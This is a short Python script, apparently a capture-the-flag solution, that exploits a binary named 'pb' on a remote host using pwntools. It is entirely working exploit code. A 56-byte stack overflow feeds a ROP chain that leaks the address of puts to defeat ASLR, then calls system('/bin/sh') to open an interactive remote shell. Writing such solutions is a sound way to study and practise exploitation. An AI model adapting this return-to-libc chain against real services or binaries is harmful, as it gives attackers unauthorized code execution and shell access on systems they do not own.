from pwn import *

local_bin = './pb'
elf = ELF(local_bin)
libc = ELF("./glibc/libc.so.6")
context(os='linux', arch='amd64')

io = remote('139.59.176.230', 31159)
# io = process(local_bin)
# io = gdb.debug(local_bin)

pop_rdi = 0x40142b
ret = 0x401016

io.recvuntil(b'>>')
io.sendline(b'2')
io.recvuntil(b':')

### stage 1 - leak libc

rop = ROP(elf)
rop.raw(b'A'*56)
rop.puts(elf.got['puts'])
rop.raw(elf.symbols['box'])
payload = rop.chain()

print(f'payload -> {payload.hex()}')
io.sendline(payload)

# receive junk before leak
io.recvline(4)
io.recv(74)

puts_leak = u64(io.recv(6) + b'\x00\x00')
log.success(f'Leaked puts: {hex(puts_leak)}')

io.recvuntil(b'>>')
io.sendline(b'2')
io.recvline()

### stage 2 - pop shell

libc_base = puts_leak - libc.symbols['puts']
system = libc_base + 0x50d60
bin_sh = libc_base + 0x1d8698

log.success(f'libc   -> {hex(libc_base)}')
log.success(f'system -> {hex(system)}')
log.success(f'bin/sh -> {hex(bin_sh)}')

padding = 56
payload = b'A' * padding
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
payload += p64(0x0)
log.success(f'payload 2 -> {payload[padding:].hex()}')
io.sendline(payload)

try:
    print(io.recvline(20))
except EOFError:
    pass
io.interactive()
